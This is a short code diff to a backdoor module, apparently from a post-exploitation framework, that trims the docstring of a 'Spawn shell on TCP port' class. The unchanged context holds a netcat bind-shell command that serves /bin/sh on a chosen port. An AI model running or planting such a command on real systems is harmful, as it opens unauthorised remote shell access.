@@ -18,9 +18,7 @@ from core.parameters import ParametersList, Parameter as P
 classname = 'Tcp'
     
 class Tcp(Module):
-    """Spawn shell on TCP port 
-    :backdoor.tcp <port>
-    """
+    """Spawn shell on TCP port"""
     
     vectors = VectorList([
             Vector('shell.sh', 'netcat-traditional', """nc -l -p %s -e /bin/sh"""),
